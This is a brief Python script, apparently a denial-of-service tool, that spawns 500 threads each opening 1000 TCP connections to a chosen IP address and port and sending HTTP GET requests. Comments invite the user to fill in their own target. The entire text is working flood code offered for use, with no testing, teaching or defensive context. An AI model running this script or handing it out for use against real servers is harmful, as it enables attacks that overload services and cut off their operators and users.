import socket
import threading
import random

def tcp_flood(ip, port, num_connections):
    for _ in range(num_connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            sock.close()
        except:
            pass

target_ip = "192.168.1.1"  # Replace with the target IP address
target_port = 80  # Replace with the target port
num_connections = 1000  # Connections created per second

for i in range(500):
    thread = threading.Thread(target=tcp_flood, args=(target_ip, target_port, num_connections))
    thread.start()
